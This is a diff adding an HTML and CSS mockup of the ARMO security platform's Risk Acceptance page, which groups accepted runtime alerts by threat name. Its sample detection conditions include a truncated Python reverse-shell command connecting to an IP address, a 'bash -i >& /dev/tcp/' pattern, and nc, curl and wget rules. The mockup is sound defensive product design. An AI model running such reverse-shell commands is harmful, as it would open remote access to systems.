@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>ARMO Risk Acceptance — Grouped View Mockup</title>
+<style>
+  :root{
+    --bg:#ffffff;
+    --sidebar:#ffffff;
+    --ink:#0b1f4d;
+    --ink-soft:#3a4a78;
+    --muted:#6b7591;
+    --line:#e5e9f2;
+    --line-soft:#eef1f7;
+    --row-hover:#f6f8fc;
+    --row-expanded:#f9fbff;
+    --row-selected:#eef4ff;
+    --chip-bg:#eef2fb;
+    --chip-ink:#2a3a6b;
+    --chip-cluster-bg:#e6f0ff;
+    --chip-cluster-ink:#0b3a8c;
+    --chip-ns-bg:#eaf5ee;
+    --chip-ns-ink:#1f6b3a;
+    --chip-wl-bg:#f3ecfb;
+    --chip-wl-ink:#5a2aa0;
+    --chip-cond-bg:#fff2e0;
+    --chip-cond-ink:#8a4a00;
+    --critical:#a5103a;
+    --high:#c43a16;
+    --medium:#c97a00;
+    --low:#a6800a;
+    --primary:#1d4ed8;
+    --primary-soft:#e8efff;
+    --shadow:0 1px 2px rgba(11,31,77,.04), 0 4px 12px rgba(11,31,77,.06);
+    --badge-bg:#e8efff;
+    --badge-ink:#1d4ed8;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:#f4f6fb;color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Arial,sans-serif;font-size:14px;line-height:1.4}
+  .app{display:grid;grid-template-columns:240px 1fr;min-height:100vh}
+
+  /* Sidebar */
+  .sidebar{background:#fff;border-right:1px solid var(--line);padding:18px 12px;position:sticky;top:0;height:100vh;overflow:auto}
+  .sidebar h4{margin:18px 8px 6px;font-size:11px;letter-spacing:.08em;color:var(--ink);text-transform:none;font-weight:700}
+  .nav{display:flex;flex-direction:column;gap:1px}
+  .nav a{display:flex;align-items:center;gap:10px;padding:8px 10px;color:var(--ink-soft);text-decoration:none;border-radius:8px;font-size:13.5px;cursor:pointer}
+  .nav a:hover{background:#f4f6fb}
+  .nav a.active{background:var(--primary-soft);color:var(--primary);font-weight:600}
+  .nav .ic{width:16px;height:16px;display:inline-block;border-radius:3px;background:#cfd6e6}
+  .nav a.active .ic{background:var(--primary)}
+
+  /* Main */
+  .main{padding:0;position:relative}
+  .topbar{display:flex;align-items:center;justify-content:flex-end;gap:10px;padding:10px 24px;background:#fff;border-bottom:1px solid var(--line)}
+  .pill{padding:4px 10px;border:1px solid #b7e1d3;border-radius:999px;font-size:12px;color:#0a6e4a}
+  .pill.enterprise{border-color:#cdd9f6;color:#1d4ed8}
+  .icon-btn{width:28px;height:28px;border:1px solid var(--line);border-radius:8px;display:inline-flex;align-items:center;justify-content:center;color:var(--ink-soft);background:#fff}
+
+  .page{padding:20px 24px 60px;transition:padding-right .25s ease}
+  .page.with-panel{padding-right:520px}
+  .page h1{font-size:18px;color:var(--ink);margin:0 0 12px}
+  .info{background:#f3f6fc;border:1px solid #dfe6f4;color:var(--ink-soft);padding:10px 14px;border-radius:10px;margin-bottom:14px;font-size:13px}
+
+  .tabs{display:flex;gap:22px;border-bottom:1px solid var(--line);margin-bottom:14px}
+  .tabs a{padding:10px 2px;color:var(--muted);text-decoration:none;font-size:13.5px;border-bottom:2px solid transparent;cursor:pointer}
+  .tabs a.active{color:var(--ink);border-bottom-color:var(--primary);font-weight:600}
+
+  .filters{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0 14px}
+  .filter{border:1px solid #cdd6e8;color:var(--ink);background:#fff;border-radius:999px;padding:6px 14px;font-size:13px;display:inline-flex;align-items:center;gap:6px;cursor:pointer}
+  .filter .caret{color:var(--ink-soft);font-size:10px}
+  .filter.scope-new{border-color:#cdd9f6;color:var(--primary);background:#f5f8ff}
+
+  /* Table */
+  .card{background:#fff;border:1px solid var(--line);border-radius:12px;box-shadow:var(--shadow);overflow:hidden}
+  table{width:100%;border-collapse:collapse;table-layout:fixed}
+  thead th{position:sticky;top:0;background:#fafbfe;color:var(--ink);font-size:11px;letter-spacing:.06em;text-transform:uppercase;font-weight:700;text-align:left;padding:12px 14px;border-bottom:1px solid var(--line)}
+  thead th .arrow{color:var(--muted);font-size:10px;margin-left:4px}
+  tbody td{padding:12px 14px;border-bottom:1px solid var(--line-soft);vertical-align:middle}
+  tbody tr.parent{cursor:pointer}
+  tbody tr.parent:hover{background:var(--row-hover)}
+  tbody tr.child{background:var(--row-expanded);cursor:pointer}
+  tbody tr.child:hover{background:#eef4ff}
+  tbody tr.child.selected{background:var(--row-selected);box-shadow:inset 3px 0 0 var(--primary)}
+  tbody tr.child td:first-child{padding-left:46px;color:var(--ink-soft)}
+  tbody tr.parent.expanded{background:#f1f5fc}
+  tbody tr.parent.expanded td:first-child{font-weight:700}
+  tbody tr.child td{border-bottom:1px dashed #dde4f1}
+  tbody tr.child:last-of-type td{border-bottom:1px solid var(--line-soft)}
+
+  .name-cell{display:flex;align-items:center;gap:10px}
+  .chev{width:18px;height:18px;display:inline-flex;align-items:center;justify-content:center;color:var(--ink-soft);transition:transform .15s ease;font-size:11px}
+  .expanded .chev{transform:rotate(90deg)}
+  .count-badge{display:inline-flex;align-items:center;gap:4px;background:var(--badge-bg);color:var(--badge-ink);padding:2px 8px;border-radius:999px;font-size:11.5px;font-weight:700}
+
+  /* severity */
+  .sev{font-weight:700}
+  .sev.critical{color:var(--critical)}
+  .sev.high{color:var(--high)}
+  .sev.medium{color:var(--medium)}
+  .sev.low{color:var(--low)}
+  .sev.mixed{color:var(--ink-soft);font-weight:600}
+
+  /* Scope chips */
+  .scope-cell{display:flex;flex-wrap:wrap;gap:4px;align-items:center}
+  .chip{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:6px;font-size:11.5px;font-weight:600;white-space:nowrap;line-height:1.5}
+  .chip .lbl{font-weight:500;opacity:.7;margin-right:2px}
+  .chip.cluster{background:var(--chip-cluster-bg);color:var(--chip-cluster-ink)}
+  .chip.ns{background:var(--chip-ns-bg);color:var(--chip-ns-ink)}
+  .chip.wl{background:var(--chip-wl-bg);color:var(--chip-wl-ink)}
+  .chip.cond{background:var(--chip-cond-bg);color:var(--chip-cond-ink);cursor:help;position:relative}
+  .chip.cond:hover .tooltip{display:block}
+  .chip.muted{background:#f0f3fa;color:var(--muted)}
+  .chip.add{background:transparent;color:var(--primary);border:1px dashed #b6c4ec;cursor:pointer;font-weight:600}
+  .chip.add:hover{background:#f5f8ff}
+
+  .tooltip{display:none;position:absolute;left:0;top:calc(100% + 6px);min-width:340px;background:#0b1f4d;color:#fff;border-radius:8px;padding:10px 12px;font-size:12px;font-weight:400;line-height:1.5;z-index:10;box-shadow:0 8px 24px rgba(11,31,77,.2)}
+  .tooltip b{color:#cfe0ff;font-weight:600}
+  .tooltip .row{display:flex;gap:6px;margin-bottom:4px}
+  .tooltip .row:last-child{margin-bottom:0}
+  .tooltip code{background:rgba(255,255,255,.08);padding:1px 5px;border-radius:4px;font-size:11px;font-family:ui-monospace,Menlo,Consolas,monospace;word-break:break-all}
+
+  .accepted-by{color:var(--ink-soft)}
+  .never{color:var(--muted);font-weight:600;letter-spacing:.04em;font-size:12px}
+
+  /* Column widths */
+  col.c-name{width:28%}
+  col.c-sev{width:9%}
+  col.c-scope{width:34%}
+  col.c-acc{width:13%}
+  col.c-exp{width:8%}
+  col.c-date{width:8%}
+
+  /* Footnote */
+  .legend{display:flex;align-items:center;gap:14px;padding:10px 14px;background:#fafbfe;border-top:1px solid var(--line);font-size:12px;color:var(--muted)}
+  .legend .swatch{display:inline-flex;align-items:center;gap:6px}
+  .legend .chip{font-size:11px;padding:1px 7px}
+
+  /* Annotations */
+  .callouts{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:18px}
+  .callout{background:#fff;border:1px solid var(--line);border-radius:10px;padding:14px}
+  .callout h5{margin:0 0 6px;color:var(--ink);font-size:13px}
+  .callout p{margin:0;color:var(--ink-soft);font-size:12.5px}
+  .kbd{font-family:ui-monospace,Menlo,Consolas,monospace;background:#eef2fb;color:var(--ink);padding:1px 5px;border-radius:4px;font-size:11px}
+
+  /* Right side detail panel */
+  .detail-panel{position:fixed;top:0;right:0;width:520px;height:100vh;background:#fff;border-left:1px solid var(--line);box-shadow:-12px 0 30px rgba(11,31,77,.08);z-index:50;display:flex;flex-direction:column;transform:translateX(0);transition:transform .25s ease}
+  .detail-panel.hidden{transform:translateX(100%)}
+  .panel-header{display:flex;align-items:center;justify-content:space-between;padding:18px 22px;border-bottom:1px solid var(--line)}
+  .panel-header h3{margin:0;font-size:16px;color:var(--ink)}
+  .panel-close{background:transparent;border:none;font-size:18px;color:var(--ink-soft);cursor:pointer;padding:4px 8px;border-radius:6px}
+  .panel-close:hover{background:#f4f6fb}
+  .panel-body{flex:1;overflow:auto;padding:6px 0}
+  .panel-row{display:grid;grid-template-columns:130px 1fr;gap:12px;padding:14px 22px;border-bottom:1px solid var(--line-soft);align-items:start}
+  .panel-row .lbl{font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:700;padding-top:2px}
+  .panel-row .val{color:var(--ink);font-size:13.5px;word-break:break-word}
+  .panel-row .val .strong{font-weight:700;font-size:14px;color:var(--ink)}
+  .panel-row .val .arn{color:var(--muted);font-size:12px;display:block;margin-top:4px;font-family:ui-monospace,Menlo,Consolas,monospace}
+  .panel-row .val.code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;background:#f8fafd;padding:8px 10px;border-radius:6px;border:1px solid var(--line-soft);white-space:pre-wrap}
+  .entity-line{font-size:12.5px;color:var(--ink);padding:3px 0;line-height:1.5}
+  .entity-line .e-type{display:inline-block;min-width:54px;color:var(--chip-cluster-ink);font-weight:700}
+  .entity-line .e-attr{color:var(--ink-soft)}
+  .entity-line .e-cond{color:var(--muted);margin:0 4px}
+  .entity-line code{background:#fff2e0;color:#8a4a00;padding:1px 5px;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11.5px;word-break:break-all}
+  .panel-foot{padding:16px 22px;border-top:1px solid var(--line);display:flex;gap:10px;background:#fafbfe}
+  .btn{padding:8px 16px;border-radius:8px;font-size:13px;cursor:pointer;border:1px solid var(--line);background:#fff;color:var(--ink);font-weight:600}
+  .btn.primary{background:var(--primary);border-color:var(--primary);color:#fff}
+  .btn.danger{background:#fff;color:#a5103a;border-color:#f3c4cd}
+  .crumb{color:var(--muted);font-size:11.5px;margin-bottom:4px;letter-spacing:.04em;text-transform:uppercase;font-weight:700}
+
+  .panel-overlay{position:fixed;inset:0;background:rgba(11,31,77,.18);z-index:40;opacity:1;transition:opacity .25s ease}
+  .panel-overlay.hidden{opacity:0;pointer-events:none}
+
+  @media (max-width:1280px){
+    .page.with-panel{padding-right:24px}
+  }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- Sidebar (matches screenshots) -->
+  <aside class="sidebar">
+    <div style="font-weight:800;color:var(--ink);padding:0 8px 12px;font-size:14px;letter-spacing:.04em">ARMO</div>
+    <div class="nav">
+      <a><span class="ic"></span>Inventory</a>
+    </div>
+    <h4>Posture</h4>
+    <div class="nav">
+      <a><span class="ic"></span>Security Risks</a>
+      <a><span class="ic"></span>Attack Path</a>
+      <a><span class="ic"></span>Vulnerabilities</a>
+      <a><span class="ic"></span>Compliance</a>
+      <a><span class="ic"></span>Identities &amp; Roles</a>
+    </div>
+    <h4>Prevention</h4>
+    <div class="nav">
+      <a><span class="ic"></span>Network Policies</a>
+      <a><span class="ic"></span>Seccomp Profiles</a>
+    </div>
+    <h4>Threat Detection</h4>
+    <div class="nav">
+      <a><span class="ic"></span>Runtime Incidents</a>
+    </div>
+    <h4>Code</h4>
+    <div class="nav">
+      <a><span class="ic"></span>Repository Scanning</a>
+      <a><span class="ic"></span>Registry Scanning</a>
+    </div>
+    <h4>Policies</h4>
+    <div class="nav">
+      <a class="active"><span class="ic"></span>Risk Acceptance</a>
+      <a><span class="ic"></span>Threat Detection</a>
+      <a><span class="ic"></span>Workflows</a>
+    </div>
+    <div style="margin-top:24px"><a class="nav-link" style="display:block;padding:8px 10px;color:var(--ink-soft);text-decoration:none">⚙ Settings</a></div>
+  </aside>
+
+  <!-- Main -->
+  <main class="main">
+    <div class="topbar">
+      <span class="pill">ARMO Platform ▾</span>
+      <span class="pill enterprise">Enterprise</span>
+      <span class="icon-btn">?</span>
+      <span class="pill" style="border-color:#b7e1d3;color:#0a6e4a">● Healthy</span>
+    </div>
+
+    <div class="page with-panel" id="page">
+      <h1>Risk Acceptance</h1>
+      <div class="info">This page consolidates all accepted risks and lets you review and manage them. Acceptances of the same threat are now grouped — expand a row to compare scopes side-by-side, click any acceptance to see full details on the right.</div>
+
+      <div class="tabs">
+        <a>Security Risks</a>
+        <a>Vulnerabilities</a>
+        <a>Compliance</a>
+        <a class="active">Runtime Incidents</a>
+      </div>
+
+      <div class="filters">
+        <span class="filter">Threat name <span class="caret">▾</span></span>
+        <span class="filter">Severity <span class="caret">▾</span></span>
+        <span class="filter">Expiration Date <span class="caret">▾</span></span>
+        <span class="filter">Accepted By <span class="caret">▾</span></span>
+        <span class="filter">Acceptance Date <span class="caret">▾</span></span>
+        <span class="filter scope-new">Scope <span class="caret">▾</span></span>
+      </div>
+
+      <div class="card">
+        <table>
+          <colgroup>
+            <col class="c-name"><col class="c-sev"><col class="c-scope"><col class="c-acc"><col class="c-exp"><col class="c-date">
+          </colgroup>
+          <thead>
+            <tr>
+              <th>Threat name</th>
+              <th>Severity</th>
+              <th>Scope</th>
+              <th>Accepted by</th>
+              <th>Expiration <span class="arrow">↕</span></th>
+              <th>Accepted <span class="arrow">▼</span></th>
+            </tr>
+          </thead>
+          <tbody>
+
+            <!-- GROUP 1: Reverse Shell Patterns Detected (3 acceptances) -->
+            <tr class="parent expanded" onclick="toggleGroup(this)">
+              <td>
+                <div class="name-cell">
+                  <span class="chev">▶</span>
+                  <span>Reverse Shell Patterns Detected</span>
+                  <span class="count-badge">3 rules</span>
+                </div>
+              </td>
+              <td><span class="sev critical">Critical</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip muted">3 clusters · 3 namespaces · 3 workloads</span>
+                </div>
+              </td>
+              <td class="accepted-by">armo-support@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child selected" onclick="openDetail(this, 'rs1')">
+              <td>↳ Acceptance #1</td>
+              <td><span class="sev critical">Critical</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> armo-cadr-demo-cluster</span>
+                  <span class="chip ns"><span class="lbl">NS</span> attack-suite</span>
+                  <span class="chip wl"><span class="lbl">WL</span> changedetection</span>
+                  <span class="chip cond">+4 conditions
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>python3</code></div>
+                      <div class="row"><b>Process · Command line · in</b> <code>/usr/local/bin/python3 -c import os,pty,socket;…</code></div>
+                      <div class="row"><b>File · Name · in</b> <code>python3.10</code></div>
+                      <div class="row"><b>File · Directory · in</b> <code>/usr/local/bin</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">armo-support@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'rs2')">
+              <td>↳ Acceptance #2</td>
+              <td><span class="sev critical">Critical</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> prod-eu-west</span>
+                  <span class="chip ns"><span class="lbl">NS</span> backend</span>
+                  <span class="chip wl"><span class="lbl">WL</span> api-gateway</span>
+                  <span class="chip cond">+2 conditions
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>bash</code></div>
+                      <div class="row"><b>Process · Command line · contains</b> <code>bash -i &gt;&amp; /dev/tcp/</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">armo-support@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'rs3')">
+              <td>↳ Acceptance #3</td>
+              <td><span class="sev critical">Critical</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> staging-us-east</span>
+                  <span class="chip ns"><span class="lbl">NS</span> security-tests</span>
+                  <span class="chip wl"><span class="lbl">WL</span> redteam-runner</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>nc</code>, <code>ncat</code></div>
+                    </span>
+                  </span>
+                  <span class="chip add" onclick="event.stopPropagation()">+ Add scope</span>
+                </div>
+              </td>
+              <td class="accepted-by">armo-support@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+
+            <!-- GROUP 2: Code Sharing Site Access (3 acceptances) -->
+            <tr class="parent expanded" onclick="toggleGroup(this)">
+              <td>
+                <div class="name-cell">
+                  <span class="chev">▶</span>
+                  <span>Code Sharing Site Access</span>
+                  <span class="count-badge">3 rules</span>
+                </div>
+              </td>
+              <td><span class="sev medium">Medium</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip muted">2 clusters · 3 namespaces · 3 workloads</span>
+                </div>
+              </td>
+              <td class="accepted-by">Multiple</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'cs1')">
+              <td>↳ Acceptance #1</td>
+              <td><span class="sev medium">Medium</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> armo-cadr-demo-cluster</span>
+                  <span class="chip ns"><span class="lbl">NS</span> dev-tools</span>
+                  <span class="chip wl"><span class="lbl">WL</span> code-server</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Network · Domain · in</b> <code>pastebin.com</code>, <code>gist.github.com</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">N/A</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'cs2')">
+              <td>↳ Acceptance #2</td>
+              <td><span class="sev medium">Medium</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> armo-cadr-demo-cluster</span>
+                  <span class="chip ns"><span class="lbl">NS</span> dev-tools</span>
+                  <span class="chip wl"><span class="lbl">WL</span> jupyter-notebook</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Network · Domain · in</b> <code>gist.github.com</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">armo-support@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'cs3')">
+              <td>↳ Acceptance #3</td>
+              <td><span class="sev medium">Medium</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> prod-eu-west</span>
+                  <span class="chip ns"><span class="lbl">NS</span> data-science</span>
+                  <span class="chip wl"><span class="lbl">WL</span> ml-trainer</span>
+                  <span class="chip cond">+2 conditions
+                    <span class="tooltip">
+                      <div class="row"><b>Network · Domain · in</b> <code>pastebin.com</code></div>
+                      <div class="row"><b>Process · Name · in</b> <code>curl</code>, <code>wget</code></div>
+                    </span>
+                  </span>
+                  <span class="chip add" onclick="event.stopPropagation()">+ Add scope</span>
+                </div>
+              </td>
+              <td class="accepted-by">N/A</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Apr 19, 2026</td>
+            </tr>
+
+            <!-- GROUP 3: Unexpected process launched (3 acceptances) -->
+            <tr class="parent expanded" onclick="toggleGroup(this)">
+              <td>
+                <div class="name-cell">
+                  <span class="chev">▶</span>
+                  <span>Unexpected process launched</span>
+                  <span class="count-badge">3 rules</span>
+                </div>
+              </td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip muted">2 clusters · 3 namespaces · 3 workloads</span>
+                </div>
+              </td>
+              <td class="accepted-by">Multiple</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Mar 4, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'up1')">
+              <td>↳ Acceptance #1</td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> armo-cadr-demo-cluster</span>
+                  <span class="chip ns"><span class="lbl">NS</span> monitoring</span>
+                  <span class="chip wl"><span class="lbl">WL</span> prometheus</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>node_exporter</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">jonathang@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Mar 4, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'up2')">
+              <td>↳ Acceptance #2</td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> armo-cadr-demo-cluster</span>
+                  <span class="chip ns"><span class="lbl">NS</span> logging</span>
+                  <span class="chip wl"><span class="lbl">WL</span> fluentd</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>ruby</code></div>
+                    </span>
+                  </span>
+                </div>
+              </td>
+              <td class="accepted-by">jonathang@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Mar 4, 2026</td>
+            </tr>
+            <tr class="child" onclick="openDetail(this, 'up3')">
+              <td>↳ Acceptance #3</td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Cluster</span> prod-eu-west</span>
+                  <span class="chip ns"><span class="lbl">NS</span> ops</span>
+                  <span class="chip wl"><span class="lbl">WL</span> backup-runner</span>
+                  <span class="chip cond">+1 condition
+                    <span class="tooltip">
+                      <div class="row"><b>Process · Name · in</b> <code>rsync</code>, <code>tar</code></div>
+                    </span>
+                  </span>
+                  <span class="chip add" onclick="event.stopPropagation()">+ Add scope</span>
+                </div>
+              </td>
+              <td class="accepted-by">ben@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Feb 17, 2026</td>
+            </tr>
+
+            <!-- Singletons (no chevron, drill-down still opens panel) -->
+            <tr class="parent" onclick="openDetail(this, 'aws-snap')">
+              <td>
+                <div class="name-cell">
+                  <span class="chev" style="visibility:hidden">▶</span>
+                  <span>AWS Snapshot deleted</span>
+                </div>
+              </td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Account</span> 015253967648</span>
+                  <span class="chip ns"><span class="lbl">Region</span> eu-west-3</span>
+                </div>
+              </td>
+              <td class="accepted-by">eranm@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Jan 11, 2026</td>
+            </tr>
+
+            <tr class="parent" onclick="openDetail(this, 'aws-user')">
+              <td>
+                <div class="name-cell">
+                  <span class="chev" style="visibility:hidden">▶</span>
+                  <span>Create AWS user</span>
+                </div>
+              </td>
+              <td><span class="sev low">Low</span></td>
+              <td>
+                <div class="scope-cell">
+                  <span class="chip cluster"><span class="lbl">Account</span> 015253967648</span>
+                </div>
+              </td>
+              <td class="accepted-by">yossib@armosec.io</td>
+              <td><span class="never">NEVER</span></td>
+              <td>Dec 3, 2025</td>
+            </tr>
+
+          </tbody>
+        </table>
+        <div class="legend">
+          <span class="swatch"><span class="chip cluster" style="font-size:10px;padding:1px 6px">Cluster</span></span>
+          <span class="swatch"><span class="chip ns" style="font-size:10px;padding:1px 6px">Namespace</span></span>
+          <span class="swatch"><span class="chip wl" style="font-size:10px;padding:1px 6px">Workload</span></span>
+          <span class="swatch"><span class="chip cond" style="font-size:10px;padding:1px 6px">Advanced conditions (hover for details)</span></span>
+        </div>
+      </div>
+
+      <!-- Annotations -->
+      <div class="callouts">
+        <div class="callout">
+          <h5>1 · Group identical threat names</h5>
+          <p>Same-name acceptances collapse into one parent row with a <span class="kbd">3 rules</span> count badge. All groups expanded by default; click the chevron to collapse. The aggregate row summarizes scope spread (<i>"3 clusters · 3 namespaces"</i>) so users get instant signal even when collapsed.</p>
+        </div>
+        <div class="callout">
+          <h5>2 · Inline scope chips + hover</h5>
+          <p>Each acceptance shows scope as colored chips: <b>cluster</b>, <b>namespace</b>, <b>workload</b>. The <span class="chip cond" style="display:inline-block;font-size:11px;padding:1px 7px">+N conditions</span> chip surfaces advanced entities; hover reveals the full condition list — no click needed to compare across rows.</p>
+        </div>
+        <div class="callout">
+          <h5>3 · Click any row → drill-down panel</h5>
+          <p>Clicking an acceptance row opens the <b>Risk Acceptance Details</b> panel on the right (current behavior preserved, see screenshot 2). The selected row gets a blue accent and tinted background so users always know which acceptance the panel describes. <i>Currently showing: Reverse Shell · Acceptance #1.</i></p>
+        </div>
+      </div>
+
+    </div>
+  </main>
+</div>
+
+<!-- Right side detail panel (drill-down for Acceptance #1 of Reverse Shell) -->
+<aside class="detail-panel" id="detailPanel">
+  <div class="panel-header">
+    <div>
+      <div class="crumb">Reverse Shell Patterns Detected · Acceptance #1 of 3</div>
+      <h3>Risk Acceptance Details</h3>
+    </div>
+    <button class="panel-close" onclick="closeDetail()">✕</button>
+  </div>
+
+  <div class="panel-body">
+    <div class="panel-row">
+      <div class="lbl">Threat<br>name</div>
+      <div class="val"><span class="strong">Reverse Shell Patterns Detected</span></div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Severity</div>
+      <div class="val"><span class="sev critical">Critical</span></div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Clusters</div>
+      <div class="val">
+        <span class="strong">armo-cadr-demo-cluster</span>
+        <span class="arn">arn:aws:eks:eu-west-3:015253967648:cluster/armo-cadr-demo-cluster</span>
+      </div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Namespace</div>
+      <div class="val">attack-suite</div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Workload</div>
+      <div class="val">changedetection</div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Scope<br>entities</div>
+      <div class="val">
+        <div class="entity-line"><span class="e-type">Process</span><span class="e-attr">Name</span><span class="e-cond">in</span><code>python3</code></div>
+        <div class="entity-line"><span class="e-type">Process</span><span class="e-attr">Command line</span><span class="e-cond">in</span><code>/usr/local/bin/python3 -c import os,pty,socket;s=socket.socket();s.connect(("18.175.149.107",8888));os.dup2(s.fileno()…</code></div>
+        <div class="entity-line"><span class="e-type">File</span><span class="e-attr">Name</span><span class="e-cond">in</span><code>python3.10</code></div>
+        <div class="entity-line"><span class="e-type">File</span><span class="e-attr">Directory</span><span class="e-cond">in</span><code>/usr/local/bin</code></div>
+      </div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Reason</div>
+      <div class="val" style="color:var(--muted);font-style:italic">No reason provided</div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Accepted by</div>
+      <div class="val">armo-support@armosec.io</div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Acceptance<br>date</div>
+      <div class="val">Apr 19, 2026</div>
+    </div>
+    <div class="panel-row">
+      <div class="lbl">Expires</div>
+      <div class="val"><span class="never">NEVER</span></div>
+    </div>
+  </div>
+
+  <div class="panel-foot">
+    <button class="btn primary">Edit</button>
+    <button class="btn">Duplicate scope</button>
+    <button class="btn danger" style="margin-left:auto">Revoke</button>
+  </div>
+</aside>
+
+<script>
+  function toggleGroup(row){
+    if(!row.classList.contains('parent')) return;
+    // singleton parents (no chevron) — click opens detail instead
+    const chev = row.querySelector('.chev');
+    if(chev && chev.style.visibility === 'hidden') return;
+    const expanded = row.classList.toggle('expanded');
+    let n = row.nextElementSibling;
+    while(n && n.classList.contains('child')){
+      n.style.display = expanded ? '' : 'none';
+      n = n.nextElementSibling;
+    }
+  }
+  function openDetail(rowEl, id){
+    document.querySelectorAll('tr.child.selected, tr.parent.selected').forEach(r=>r.classList.remove('selected'));
+    rowEl.classList.add('selected');
+    document.getElementById('detailPanel').classList.remove('hidden');
+    document.getElementById('page').classList.add('with-panel');
+  }
+  function closeDetail(){
+    document.getElementById('detailPanel').classList.add('hidden');
+    document.getElementById('page').classList.remove('with-panel');
+    document.querySelectorAll('tr.child.selected, tr.parent.selected').forEach(r=>r.classList.remove('selected'));
+  }
+</script>
+</body>
+</html>
